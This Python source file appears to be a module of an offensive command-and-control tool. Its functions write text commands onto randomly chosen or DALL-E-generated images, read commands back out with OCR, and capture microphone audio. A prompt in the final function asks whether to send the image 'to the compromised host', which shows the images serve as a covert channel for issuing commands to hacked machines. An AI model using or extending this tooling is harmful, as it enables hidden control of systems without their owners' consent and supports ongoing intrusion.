import speech_recognition as sr
import random
import os
import mimetypes
from PIL import Image, ImageDraw, ImageFont
import io
import pytesseract
import numpy as np
import openai
import wave
import base64

# Performs audio processing
class audioProcessing:
    def __init__(self):
        self.result = None
        self.audioPath = None

    def capture(self):
        # Setup the audio capture
        r = sr.Recognizer()
        with sr.Microphone() as source:
            self.result = r.listen(source)

    def audioDirectory(self):
        # Get an audio file from a directory
        r = sr.Recognizer()

        with sr.AudioFile(self.audioPath) as source:
            self.result = r.record(source)

# Performs command processing
class commandProcesing:
    def __init__(self, imgDir='', imageData=None, extension='') -> None:
        self.imgDir = imgDir
        self.audioDir = None
        self.imageData = imageData
        self.extension = extension
        self.image = None
        self.audio = None
        self.mimeType = None

    def createImage(self, command):
        isImage = False
        
        # Get a list of file names in imgDir and selects an image
        imgList = os.listdir(self.imgDir)

        while isImage == False:
            randomNum = random.randint(0, len(imgList)-1)
            self.mimeType = mimetypes.guess_type(imgList[randomNum])
            if 'image' in self.mimeType[0]:
                isImage = True
                mimeSplit = self.mimeType[0].split('/')
                self.extension = str(mimeSplit[1])
        
        # Adds the text to the image and places that in an object variable
        self.image = Image.open(self.imgDir + '/' + imgList[randomNum])
        textImg = ImageDraw.Draw(self.image)
        font = ImageFont.truetype("font/Inconsolata-Regular.ttf",100)
        textImg.text((20,20), command, fill=(255,255,255), font=font)
        imgBytes = io.BytesIO()
        self.image.save(imgBytes, format=self.extension)
        self.imageData = imgBytes.getvalue()

    def streamProcess(self, args, streamData):
        # Performs the ML on the image
        self.image = Image.open(io.BytesIO(streamData.read()))
        img = np.array(self.image)
        text = pytesseract.image_to_string(img, config='--psm ' + args.p)
        print(text)

    def writeFile(self, time, directory):
        # Handles any sort of file writing
        # Check if the folder exists to write the file to
        if os.path.isdir(directory) == False:
            os.mkdir(directory)
        
        if 'commImages' in directory:
            self.image = self.image.convert('RGB')
        
            # Write the image to the directory
            self.image = self.image.save(directory + '/' + str(time) +'.jpg')
    
    def writeAudio(self, **kwargs):
        # Write the file
        self.audioDir = kwargs.get('directory') + '/' + kwargs.get(str('time')) +'.wav'
        with wave.open(self.audioDir, 'wb') as wf:
            wf.setnchannels(1) 
            wf.setsampwidth(2)  # 16-bit samples
            wf.setframerate(44100)  # Standard sample rate
            wf.writeframes(kwargs.get('result').get_wav_data())
            wf.close()
    
    def openAI(self, prompt, dalleKey):
        # Get the API key for dalle
        openai.api_key = dalleKey
        
        openaiResponse = openai.Image.create(
            prompt=prompt,
            n=1,
            size="1024x1024",
            response_format="b64_json",
        )

        # Convert the base64 to an image
        self.image = base64.b64decode(openaiResponse["data"][0]["b64_json"])
        image = Image.open(io.BytesIO(self.image))
        image.show()

        # Check if the image is what was expected
        print('Do you want to send this image to the compromised host?\nType \'retry\' to retry or \'exit\' to return to the menu.')
        response = input().lower()
        return response